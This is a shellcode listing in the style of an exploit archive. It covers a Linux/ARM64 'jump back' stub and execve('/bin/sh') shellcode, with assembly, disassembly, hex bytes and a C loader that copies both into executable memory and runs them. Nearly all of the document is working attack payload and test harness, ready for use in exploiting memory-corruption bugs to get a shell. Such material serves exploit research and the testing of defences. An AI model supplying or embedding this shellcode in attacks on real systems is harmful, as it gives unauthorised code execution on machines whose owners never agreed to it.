/*
# Title:  Linux/ARM64 - Jump Back Shellcode + execve("/bin/sh", NULL, NULL) Shellcode (8 Bytes)
# Date:   2019-06-30
# Tested: Ubuntu 16.04 (aarch64)
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c


ubuntu@ubuntu:~/works$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu Xenial Xerus (development branch)
Release:	16.04
Codename:	xenial
ubuntu@ubuntu:~/works$ uname -a
Linux ubuntu 4.2.0-16-generic #19-Ubuntu SMP Thu Oct 8 15:00:45 UTC 2015 aarch64 aarch64 aarch64 GNU/Linux
ubuntu@ubuntu:~/works$ cat jumpback.s
.section .text
.global _start
_start:
    // Jump back to _start-0x30
    adr  x10, .-0x30    // x10 = _start-0x30
    br   x10            // Jump to _start-0x30
ubuntu@ubuntu:~/works$ as -o jumpback.o jumpback.s && ld -o jumpback jumpback.o
ubuntu@ubuntu:~/works$ objdump -d ./jumpback

./jumpback:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000400078 <_start>:
  400078:	10fffe8a 	adr	x10, 400048 <_start-0x30>
  40007c:	d61f0140 	br	x10
ubuntu@ubuntu:~/works$ objcopy -O binary jumpback jumpback.bin
ubuntu@ubuntu:~/works$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' jumpback.bin && echo
\x8a\xfe\xff\x10\x40\x01\x1f\xd6

*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

// Linux/ARM64 - execve("/bin/sh", NULL, NULL) Shellcode (40 Bytes)
char shell[] =
"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

char jumpback[] =
"\x8a\xfe\xff\x10\x40\x01\x1f\xd6";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(jumpback));

    void *ptr1 = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    void *ptr2;

    if (ptr1 == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    ptr2 = ptr1 + 0x30;

    memcpy(ptr1, shell, sizeof(shell));
    memcpy(ptr2, jumpback, sizeof(jumpback));

    sc = ptr2;

    sc();

    return 0;
}